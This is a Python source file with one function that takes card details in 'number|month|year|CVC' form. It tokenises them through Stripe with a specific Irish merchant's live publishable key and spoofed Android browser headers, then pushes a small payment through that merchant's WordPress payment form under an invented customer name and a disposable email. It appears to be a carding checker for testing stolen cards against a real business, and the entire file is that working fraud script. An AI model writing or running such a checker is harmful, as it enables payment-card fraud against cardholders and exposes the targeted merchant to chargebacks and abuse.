import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F46d24303a6%3B+stripe-js-v3%2F46d24303a6%3B+card-element&referrer=https%3A%2F%2Fserenemarine.ie&time_on_page=145290&key=pk_live_51JX7EdDgnUXpF34ENm3IO5TYG8fn0BrFEhSQFNDyYPIZ3wXnwJXcBFUTo7dQFFyiC7axc7kDrnt2stoGtwID4D0d00IiKr8TD3'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'cookielawinfo-checkbox-necessary': 'yes',
	    'cookielawinfo-checkbox-functional': 'no',
	    'cookielawinfo-checkbox-performance': 'no',
	    'cookielawinfo-checkbox-analytics': 'no',
	    'cookielawinfo-checkbox-advertisement': 'no',
	    'cookielawinfo-checkbox-others': 'no',
	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOmZhbHNlLCJwZXJmb3JtYW5jZSI6ZmFsc2UsImFuYWx5dGljcyI6ZmFsc2UsImFkdmVydGlzZW1lbnQiOmZhbHNlLCJvdGhlcnMiOmZhbHNlfQ==',
	    'viewed_cookie_policy': 'yes',
	    '__stripe_mid': 'e0467228-01cd-465d-980d-9af898298cfddad894',
	    '__stripe_sid': '79c33d72-4bab-4730-878c-e32511d3733c5e3a21',
	}
	
	headers = {
	    'authority': 'serenemarine.ie',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOmZhbHNlLCJwZXJmb3JtYW5jZSI6ZmFsc2UsImFuYWx5dGljcyI6ZmFsc2UsImFkdmVydGlzZW1lbnQiOmZhbHNlLCJvdGhlcnMiOmZhbHNlfQ==; viewed_cookie_policy=yes; __stripe_mid=e0467228-01cd-465d-980d-9af898298cfddad894; __stripe_sid=79c33d72-4bab-4730-878c-e32511d3733c5e3a21',
	    'origin': 'https://serenemarine.ie',
	    'referer': 'https://serenemarine.ie/payments/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = 'action=wpf_submit_form&form_id=462&payment_total=100&form_data=__wpf_form_id%3D462%26__wpf_current_url%3Dhttps%253A%252F%252Fserenemarine.ie%252Fpayments%26__wpf_current_page_id%3D453%26customer_name%3DRodam%2520User%26number%3D2085812225%26customer_email%3Dlajaro6411%2540matmayer.com%26custom_payment_input%3D1%26terms_conditions%255B%255D%3DAgreed%26__stripe_payment_method_id%3D'+str(pm)+''
	
	r2 = requests.post('https://serenemarine.ie/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
